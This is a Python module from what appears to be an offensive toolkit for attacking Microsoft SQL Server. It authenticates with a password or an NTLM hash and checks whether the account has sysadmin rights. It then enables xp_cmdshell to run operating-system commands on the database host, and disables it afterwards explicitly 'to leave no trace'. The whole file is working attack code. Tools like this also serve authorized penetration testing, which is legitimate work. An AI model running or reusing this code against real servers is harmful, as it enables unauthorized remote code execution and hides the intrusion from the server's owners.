from impacket import tds
from impacket.nmb import NetBIOSError
from core.logger import setup_logger
from rich.console import Console

logger = setup_logger()
console = Console()

class MSSQLScanner:
    def __init__(self, target, domain, username, password, ntlm_hash=None, port=1433):
        self.target = target
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.port = port
        self.ms_sql = None
        self.is_sysadmin = False

    def connect(self):
        try:
            logger.info(f"[*] Attempting MSSQL connection to {self.target}:{self.port}...")
            self.ms_sql = tds.MSSQL(self.target, int(self.port))
            self.ms_sql.connect()
            
            # Decide auth type
            use_windows_auth = False if self.domain in ["", None, "WORKGROUP"] else True
            auth_str = f"Windows Auth ({self.domain}\\{self.username})" if use_windows_auth else f"SQL Auth ({self.username})"
            
            logger.info(f"[*] Attempting login using {auth_str}...")
            
            res = self.ms_sql.login(
                None, 
                self.username, 
                self.password, 
                self.domain, 
                self.ntlm_hash, 
                use_windows_auth
            )
            
            if res is True:
                logger.info("[+] \033[32mMSSQL Authentication Successful!\033[0m")
                return True
            else:
                logger.error("[-] MSSQL Authentication failed.")
                return False
                
        except Exception as e:
            logger.error(f"[-] MSSQL Connection Error: {str(e)}")
            return False

    def execute_query(self, query):
        try:
            self.ms_sql.sql_query(query)
            try:
                self.ms_sql.printReplies()
                self.ms_sql.printRows()
            except Exception:
                pass
                
            # If we want to capture rows, it's slightly manual in raw TDS:
            res = []
            for row in self.ms_sql.rows:
                res.append(row)
            return res
        except Exception as e:
            logger.error(f"[-] Query execution failed: {e}")
            return None

    def enum_sysadmin(self):
        logger.info("[*] Checking for sysadmin privileges...")
        rows = self.execute_query("SELECT IS_SRVROLEMEMBER('sysadmin')")
        if rows and len(rows) > 0:
            val = list(rows[0].values())[0]
            if val == 1:
                self.is_sysadmin = True
                logger.info("[+] \033[31mCRITICAL: User is a SysAdmin on this MSSQL instance!\033[0m")
            else:
                logger.info("[-] User is not a SysAdmin.")

    def enum_version(self):
        logger.info("[*] Enumerating MSSQL Version...")
        rows = self.execute_query("SELECT @@version")
        if rows and len(rows) > 0:
            version = list(rows[0].values())[0]
            for line in str(version).split('\n'):
                if line.strip():
                    logger.info(f"    {line.strip()}")
                    break # Usually first line is enough
                    
    def check_xp_cmdshell(self):
        if not self.is_sysadmin:
            return
            
        logger.info("[*] Attempting to enable xp_cmdshell for Remote Code Execution...")
        try:
            self.execute_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
            self.execute_query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
            
            logger.info("[+] \033[31mxp_cmdshell Enabled Successfully! Running 'whoami'...\033[0m")
            
            self.ms_sql.sql_query("EXEC xp_cmdshell 'whoami';")
            for row in self.ms_sql.rows:
                val = list(row.values())[0]
                if val and str(val).strip():
                     logger.info(f"[+] Output: \033[32m{val}\033[0m")
            
            # Disable it safely after checking
            logger.info("[-] Disabling xp_cmdshell to leave no trace...")
            self.execute_query("EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;")
            self.execute_query("EXEC sp_configure 'show advanced options', 0; RECONFIGURE;")
        except Exception as e:
            logger.error(f"[-] Failed to execute xp_cmdshell: {e}")
            
    def close(self):
        if self.ms_sql:
            self.ms_sql.disconnect()

def run_mssql_enum(target, domain, username, password, ntlm_hash=None, port=1433):
    if not target:
        logger.error("A target IP/Hostname is required for MSSQL enumeration.")
        return False
        
    scanner = MSSQLScanner(target, domain, username, password, ntlm_hash, port)
    if scanner.connect():
        scanner.enum_version()
        scanner.enum_sysadmin()
        scanner.check_xp_cmdshell()
        scanner.close()
        return True
    return False
